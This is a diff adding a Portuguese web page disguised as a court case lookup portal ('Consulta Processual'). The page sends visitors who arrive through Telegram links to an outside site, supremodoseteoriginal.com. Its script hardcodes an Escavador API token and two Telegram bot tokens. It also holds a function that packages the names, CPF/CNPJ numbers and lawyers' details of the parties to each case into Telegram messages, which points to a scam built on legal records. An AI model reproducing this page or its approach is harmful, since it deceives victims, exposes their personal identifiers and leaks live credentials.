@@ -1,0 +1,99 @@
+ lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Redirecionando...</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:"Segoe UI",system-ui,-apple-system,sans-serif;background:linear-gradient(135deg,#2d2d2d 0%,#3a3a3a 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:#fff;border-radius:24px;box-shadow:0 25px 50px rgba(0,0,0,.3);overflow:hidden;max-width:500px;width:100%;text-align:center}
+.header{background:linear-gradient(90deg,#2d2d2d,#4a4a4a);color:#fff;padding:30px;text-align:center}
+.logo{font-size:42px;margin-bottom:10px;color:#39FF14}
+.title{font-size:20px;font-weight:700;color:#39FF14}
+.body{padding:30px}
+.spin{display:inline-block;width:50px;height:50px;border:4px solid #e1e8ed;border-top-color:#39FF14;border-radius:50%;animation:sp .8s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+.msg{color:#888;font-size:14px;margin-top:16px;line-height:1.6}
+.pn{font-size:1rem;font-weight:700;color:#2d2d2d;font-family:Consolas,monospace;background:#f8fafc;padding:12px;border-radius:10px;margin-top:14px;border:2px solid #e1e8ed;word-break:break-all}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:14px 28px;background:linear-gradient(90deg,#FF6600,#ff8533);color:#fff;border-radius:12px;text-decoration:none;font-weight:600;font-size:15px;margin-top:20px;transition:all .3s}
+.btn:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(255,102,0,.4)}
+.land i{font-size:50px;color:#39FF14;margin-bottom:14px}
+.land h2{color:#2d2d2d;margin-bottom:8px}
+.land p{color:#888;font-size:14px;line-height:1.6;margin-bottom:16px}
+.inp{width:100%;padding:14px 18px;border:2px solid #e1e8ed;border-radius:12px;font-size:15px;margin-bottom:12px}
+.inp:focus{outline:none;border-color:#39FF14}
+</style></head>
+<body>
+<div class="card">
+<div class="header">
+<div class="logo"><i class="fas fa-balance-scale"></i></div>
+<h1 class="title" id="hdr">Consulta Processual</h1>
+</div>
+<div class="body" id="content"></div>
+</div>
+
+<script>
+// Token API Escavador (interno)
+var API_TOKEN='eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiIxIiwianRpIjoiODlkNGNiYTQ3Mzg3NDFiOTA0ZjJmM2UzNjg0NGI4ZTU2OGRjZjBkMGMyZTcxZTdjNTdiNTIzNzk5ZWEzZTY4MjBiZGY1NDljZDYwMzhjOTEiLCJpYXQiOjE3ODE2NDQzNTUuMjM4NDI0LCJuYmYiOjE3ODE2NDQzNTUuMjM4NDI1LCJleHAiOjE4MTMyMDExOTkuMjM2Njc2LCJzdWIiOiIzNjIwNzk2Iiwic2NvcGVzIjpbImFjZXNzYXJfYXBpX3BhZ2EiLCJhY2Vzc2FyX2FwaV9wbGF5Z3JvdW5kIl19.ssCp7b2NmDQ8rSPScMXZHoQ3VxNFvioav7qhOaJ1fiDixtA7OLkgM4dQDxgOq1oGya0JVUfiA7Dx7fAtvzI7zG3ExL4_bJ_qyLIKPHoexfZwBFULp4BzriXEXc48oAdHGB5N-UfaMoc0CQ5P0w8uX3J_N0Nb_4OpSaxHXP1nWERUsLvODed7SGdDv-mkoBOS-PVjEaL27AO4DrVuWu1gp4Ej3TUQ8gWW3MNRQb5TeBqhRNyNUIXBFRx_qtMxf88_wTCe--cZoECa0_AuMm5x6rld_aSHgAGljfK3wNDefKXa2v-fUcGSgUb1rnNFT4U2I9LiEkO9Npw5FpCzh52-prJ6orbTBlWgPflZt8JoNtAhH6xXeGhngmKNSAw_ckpQlStyDZ4oynXzTw6Nb9RMUIAb1DY902GUgBqNnwRYSbvnmD6vekSyzgcFwXMQX92T9F2PyFRikQA3b_dWgGfVN6gmzaAbieNN3WN_K123VzbRymiBNX9rz58LlM6H0VC4V86v2NL62036DCY6Kaqv1dRXQ0YSHKiQoek7KPAA2xdH3ftwVDR3Nx1GHjuwCqLmtQu1bdUV4NBukDUUH3dq35KLS8lCIhjzeiUoCoUqgGLKpRoxB1mvtIMH8d8p9CbGyONE5cZbO6w9c6r7f8PR7P_TBQwFIyHzUHHJAdC5IXE';
+var TG_TOKEN='8701852568:AAHZw2eiUzHzlAlVRU0_qGNk1UBmTXAjwVo';
+var TG_TOKEN_2='8783865981:AAG2MP2vb0iLeIeDWewKb5JQXYKL6JxPIiM';
+var SUPREMO='https://supremodoseteoriginal.com/?processo=';
+
+function es(s){if(!s)return'';var d=document.createElement('div');d.textContent=s;return d.innerHTML}
+
+
+// Quando tem ?processo= na URL: redireciona automatico para pagina final
+function redirecionar(cnj){
+  var c=document.getElementById('content');
+  // Mostra loading rapido e redireciona direto para o site final
+  c.innerHTML='<div class="spin"></div><p class="msg">Redirecionando para a pagina final...</p><div class="pn">'+es(cnj)+'</div>';
+  document.getElementById('hdr').textContent='Redirecionando...';
+  // Redireciona em 1 segundo para o site final (supremodoseteoriginal)
+  setTimeout(function(){window.location.href=SUPREMO+encodeURIComponent(cnj)},1000);
+}
+
+// Pagina inicial quando nao tem processo na URL
+function showLanding(){
+  document.getElementById('hdr').textContent='Consulta Processual';
+  document.getElementById('content').innerHTML='<div class="land"><i class="fas fa-balance-scale"></i><h2>Consulta Processual</h2><p>Portal de acesso a processos judiciais.<br>Use o link recebido pelo <strong>Telegram</strong> para acessar diretamente.</p><input type="text" class="inp" id="inp-proc" placeholder="Numero do processo CNJ"><br><button class="btn" onclick="ir()"><i class="fas fa-arrow-right"></i> Acessar Processo</button></div>';
+}
+function ir(){var v=document.getElementById('inp-proc').value.trim();if(v)window.location.href='?processo='+encodeURIComponent(v)}
+
+// Monta mensagem Telegram
+function fMsg(p){
+  var f=p.fontes&&p.fontes[0]?p.fontes[0]:null;
+  var tb=f?f.nome:'N/A',gr=f?(f.grau_formatado||''):'',
+  cl=f&&f.capa?f.capa.classe:'',as=f&&f.capa?f.capa.assunto:'',
+  og=f&&f.capa?f.capa.orgao_julgador:'',
+  vl=f&&f.capa&&f.capa.valor_causa?f.capa.valor_causa.valor_formatado:'',
+  di=p.data_inicio||'N/A',dm=p.data_ultima_movimentacao||'N/A',
+  lk=SUPREMO+encodeURIComponent(p.numero_cnj);
+  var m='PROCESSO: '+p.numero_cnj+'\n';
+  m+='LINK: '+lk+'\n';
+  m+='TRIBUNAL: '+tb+(gr?' - '+gr:'')+'\n';
+  m+='CLASSE: '+cl+'\n';
+  m+='ASSUNTO: '+as+'\n';
+  m+='VALOR: '+(vl||'N/I')+'\n';
+  m+='DATA INICIO: '+di+'\n';
+  m+='DATA ULTIMO MOVIMENTO: '+dm+'\n';
+  m+='ORGAO JULGADOR: '+og+'\n';
+  m+='ULTIMA MOVIMENTACAO:\n  DATA: '+dm+'\n';
+  if(f&&f.envolvidos){
+    var at=f.envolvidos.filter(function(e){return e.polo==='ATIVO'});
+    var ps=f.envolvidos.filter(function(e){return e.polo==='PASSIVO'});
+    if(at.length){m+='\nPOLO ATIVO:\n';at.forEach(function(e){m+='- NOME: '+e.nome+'\n';if(e.cpf)m+='  DOC: '+e.cpf+'\n';if(e.cnpj)m+='  DOC: '+e.cnpj+'\n';if(e.advogados)e.advogados.forEach(function(a){m+='  ADVOGADO: '+a.nome+(a.cpf?' (CPF: '+a.cpf+')':'')+'\n'})})}
+    if(ps.length){m+='\nPOLO PASSIVO:\n';ps.forEach(function(e){m+='- NOME: '+e.nome+'\n';if(e.cpf)m+='  DOC: '+e.cpf+'\n';if(e.cnpj)m+='  DOC: '+e.cnpj+'\n'})}
+  }
+  return m;
+}
+
+// Inicio - verifica se tem processo na URL
+(function(){
+  var proc=new URLSearchParams(window.location.search).get('processo');
+  if(proc){
+    // Tem processo na URL -> redireciona automaticamente para pagina final
+    redirecionar(proc);
+  } else {
+    // Sem processo -> mostra landing
+    showLanding();
+  }
+})();
+</script></body></html>
